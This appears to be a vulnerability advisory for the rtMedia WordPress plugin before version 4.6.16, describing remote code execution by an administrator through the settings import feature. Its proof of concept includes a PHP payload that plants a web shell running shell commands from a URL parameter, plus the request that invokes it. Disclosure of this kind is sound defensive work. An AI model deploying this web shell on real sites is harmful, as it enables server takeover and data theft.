## WordPress Plugin Vulnerabilities

# rtMedia for WordPress, BuddyPress and bbPress < 4.6.16 - Admin+ RCE

### Description

The plugin loads the contents of the import file in an unsafe manner, leading to remote code execution by privileged users.

### Proof of Concept

1. As an admin, visit rtMedia > Settings > Export/Import.
2. Click the "Browse File" button beside "Import rtMedia Settings".
3. Upload a file with the extension `.json` and the following contents:
<?php file\_put\_contents(WP\_CONTENT\_DIR . '/shell.php', '<?php echo system($\_GET["cmd"]);');
4. Visit `/wp-content/shell.php?cmd=id` to run arbitrary arbitrary commands.
